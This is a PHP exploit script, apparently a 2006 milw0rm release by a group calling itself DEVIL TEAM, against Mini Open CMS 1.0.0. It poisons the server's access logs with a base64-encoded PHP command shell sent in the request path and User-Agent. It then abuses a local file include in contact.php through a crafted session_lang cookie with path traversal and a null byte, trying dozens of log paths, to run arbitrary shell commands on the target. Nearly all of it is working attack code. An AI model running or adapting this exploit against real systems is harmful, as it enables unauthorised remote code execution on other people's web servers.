<?

print '
:::::::::  :::::::::: :::     ::: ::::::::::: :::        
:+:    :+: :+:        :+:     :+:     :+:     :+:        
+:+    +:+ +:+        +:+     +:+     +:+     +:+        
+#+    +:+ +#++:++#   +#+     +:+     +#+     +#+        
+#+    +#+ +#+         +#+   +#+      +#+     +#+        
#+#    #+# #+#          #+#+#+#       #+#     #+#        
#########  ##########     ###     ########### ########## 
::::::::::: ::::::::::     :::     ::::    ::::  
    :+:     :+:          :+: :+:   +:+:+: :+:+:+ 
    +:+     +:+         +:+   +:+  +:+ +:+:+ +:+ 
    +#+     +#++:++#   +#++:++#++: +#+  +:+  +#+ 
    +#+     +#+        +#+     +#+ +#+       +#+ 
    #+#     #+#        #+#     #+# #+#       #+# 
    ###     ########## ###     ### ###       ### 
	
   - - [DEVIL TEAM THE BEST POLISH TEAM] - -
 

[Exploit name: Mini Open CMS <= 1.0.0 Local File Include Exploit
[Script name: Mini Open CMS v.1.0.0
[Script site: http://www.mini-open-cms.com/



Find by: Kacper (a.k.a Rahim)


========>  DEVIL TEAM IRC: irc.milw0rm.com:6667 #devilteam  <========
========>         http://www.rahim.webd.pl/            <========

Contact: kacper1964@yahoo.pl

(c)od3d by Kacper
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Greetings DragonHeart and all DEVIL TEAM Patriots :)
- Leito & Leon 
TomZen, Gelo, Ramzes, DMX, Ci2u, Larry, @steriod, Drzewko, CrazzyIwan, Rammstein
Adam., Kicaj., DeathSpeed, Arkadius, Michas, pepi, nukedclx, SkD, MXZ, sysios, 
mIvus, nukedclx, SkD, wacky, xoron, 

 and

TamTurk,
hackersecurity.org

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
                Greetings for 4ll Fusi0n Group members ;-)
                and all members of hacker.com.pl ;)
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
';


/*
works with register_globals=On


-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

in contact.php on line 14-34:
....
	header("Cache-Control: no-cache, must-revalidate"); // HTTP/1.1
	header("Expires: Mon, 26 Jul 1997 05:00:00 GMT"); 
	session_start();
	//session_regenerate_id();
	include_once("./config.inc.php");
	if (!isset($_SESSION['session_lang']))                      // <-------{1}
	{
		$session_lang = $LANG;
        $_SESSION['session_lang']=$session_lang; // <-------{2}
	}
	else
     	$session_lang=$_SESSION['session_lang'];// end if
	include_once(INDEX_PATH."cls_fast_template.php");
	$NEWLANG = $session_lang;                                        // <-------{3}
	include_once(INCLUDE_LANGUAGE_PATH.$NEWLANG.".inc.php");             // <-------{4}

	include_once(INCLUDE_PATH."cls_string.php");
	include_once(INCLUDE_PATH."cls_universal_mailsender.php");
	include_once(INCLUDE_PATH."cls_miniFile.php");
	include_once(INCLUDE_PATH."cls_pages.php");
    include_once(INCLUDE_ADMIN_PATH."cls_arrays.php");
....


*/


if ($argc<4) {
print_r('
-----------------------------------------------------------------------------
Usage: php '.$argv[0].' host path cmd OPTIONS
host:      target server (ip/hostname)
path:      Mini_Open path
cmd:       a shell command (ls -la)
Options:
 -p[port]:    specify a port other than 80
 -P[ip:port]: specify a proxy
Example:
php '.$argv[0].' 2.2.2.2 /Mini_Open/ ls -la -P1.1.1.1:80
php '.$argv[0].' 1.1.1.1 / ls -la
-----------------------------------------------------------------------------
');

die;
}

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);
function sendpacket($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}
function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';

function make_seed()
{
   list($usec, $sec) = explode(' ', microtime());
   return (float) $sec + ((float) $usec * 100000);
}

$host=$argv[1];
$path=$argv[2];
$cmd="";

$port=80;
$proxy="";
for ($i=3; $i<$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>"-p") and ($temp<>"-P")) {$cmd.=" ".$argv[$i];}
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}


echo "insert evil code in logfiles ...\r\n\r\n";
$hauru = base64_decode("PD9waHAgb2JfY2xlYW4oKTsvL1J1Y2hvbXkgemFtZWsgSGF1cnUgOy0pZWNobyIuL".
"i5IYWNrZXIuLkthY3Blci4uTWFkZS4uaW4uLlBvbGFuZCEhLi4uREVWSUwuVEVBTS".
"4udGhlLi5iZXN0Li5wb2xpc2guLnRlYW0uLkdyZWV0ei4uLiI7ZWNobyIuLi5HbyB".
"UbyBERVZJTCBURUFNIElSQzogNzIuMjAuMTguNjo2NjY3ICNkZXZpbHRlYW0iO2Vj".
"aG8iLi4uREVWSUwgVEVBTSBTSVRFOiBodHRwOi8vd3d3LnJhaGltLndlYmQucGwvI".
"jtpbmlfc2V0KCJtYXhfZXhlY3V0aW9uX3RpbWUiLDApO2VjaG8gIkhhdXJ1IjtwYX".
"NzdGhydSgkX1NFUlZFUltIVFRQX0hBVVJVXSk7ZGllOz8+");


$packet="GET ".$p.$hauru." HTTP/1.0\r\n";
$packet.="User-Agent: ".$hauru." Googlebot/2.1\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: close\r\n\r\n";
sendpacket($packet);
sleep(3);

$paths= array (
"../../../../../var/log/httpd/access_log",
"../../../../../var/log/httpd/error_log",
"../apache/logs/error.log",
"../apache/logs/access.log",
"../../apache/logs/error.log",
"../../apache/logs/access.log",
"../../../apache/logs/error.log",
"../../../apache/logs/access.log",
"../../../../apache/logs/error.log",
"../../../../apache/logs/access.log",
"../../../../../apache/logs/error.log",
"../../../../../apache/logs/access.log",
"../logs/error.log",
"../logs/access.log",
"../../logs/error.log",
"../../logs/access.log",
"../../../logs/error.log",
"../../../logs/access.log",
"../../../../logs/error.log",
"../../../../logs/access.log",
"../../../../../logs/error.log",
"../../../../../logs/access.log",
"../../../../../etc/httpd/logs/access_log",
"../../../../../etc/httpd/logs/access.log",
"../../../../../etc/httpd/logs/error_log",
"../../../../../etc/httpd/logs/error.log",
"../../../../../var/www/logs/access_log",
"../../../../../var/www/logs/access.log",
"../../../../../usr/local/apache/logs/access_log",
"../../../../../usr/local/apache/logs/access.log",
"../../../../../var/log/apache/access_log",
"../../../../../var/log/apache/access.log",
"../../../../../var/log/access_log",
"../../../../../var/www/logs/error_log",
"../../../../../var/www/logs/error.log",
"../../../../../usr/local/apache/logs/error_log",
"../../../../../usr/local/apache/logs/error.log",
"../../../../../var/log/apache/error_log",
"../../../../../var/log/apache/error.log",
"../../../../../var/log/access_log",
"../../../../../var/log/error_log"
);

for ($i=0; $i<=count($paths)-1; $i++)
{
$a=$i+2;

echo "[".$a."] Check Path: ".$paths[$i]."\r\n";
echo "remote code execution...wait..\n";
$packet ="GET ".$p."contact.php HTTP/1.1\r\n";
$packet.="Cookie: session_lang=../".$paths[$i]."%00;\r\n";
$packet.="HAURU: ".$cmd."\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacket($packet);
if (strstr($html,"Hauru"))
{
$temp=explode("Hauru",$html);
die($temp[1]);
}
}
echo "Exploit err0r :(\r\n";
echo "Go to DEVIL TEAM IRC: 72.20.18.6:6667 #devilteam\r\n";
?>

# milw0rm.com [2006-11-17]
